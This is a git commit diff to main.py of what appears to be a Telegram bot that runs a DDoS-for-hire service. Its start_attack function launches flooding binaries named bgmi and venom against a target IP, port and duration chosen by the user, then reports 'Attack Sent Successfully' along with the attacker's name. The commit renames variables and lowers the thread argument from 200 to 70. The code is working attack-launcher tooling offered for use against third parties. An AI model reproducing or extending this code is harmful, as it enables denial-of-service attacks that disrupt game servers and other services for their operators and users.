66ee8bc47f257e67af84e3943448c5a4196f9422
Bdawplllll <bdawplllll@gmail.com>
2024-09-20 18:12:29 +0530

    Update main.py

--- main.py
+++ main.py
@@ -172,7 +172,7 @@ def add_user(message):
 
                 # Create copies of bgmi,sahil files for the new user
                 user_bgmi_path = f'bgmi{user_id}'              
-                user_sahil_path = f'venom{user_id}'
+                user_venom_path = f'venom{user_id}'
                 shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
                 shutil.copy(ORIGINAL_VENOM_PATH, user_venom_path)
 
@@ -256,16 +256,16 @@ def show_user_id(message):
 def start_attack(user_id, target, port, duration):
     attack_id = f"{user_id} {target} {port}"
     bgmi_file = f"bgmi{user_id}"
-    sahil_file = f"venom{user_id}"
+    venom_file = f"venom{user_id}"
     user = bot.get_chat(user_id)
     username = f"@{user.username}" if user.username else f"UserID: {user_id}"
     log_command(user_id, target, port, duration)
     response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration}\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿 𝗡𝗮𝗺𝗲: {username}"
     bot.send_message(user_id, response)
     try:
-        ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 200", shell=True)
+        ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 70", shell=True)
         time.sleep(5)
-        subprocess.run(f"./{venom_file} {target} {port} {duration} 200", shell=True)
+        subprocess.run(f"./{venom_file} {target} {port} {duration} 70", shell=True)
       # Set cooldown for normal users after a successful attack
         if user_id not in ADMIN_IDS:
             user_cooldowns[user_id] = datetime.datetime.now()
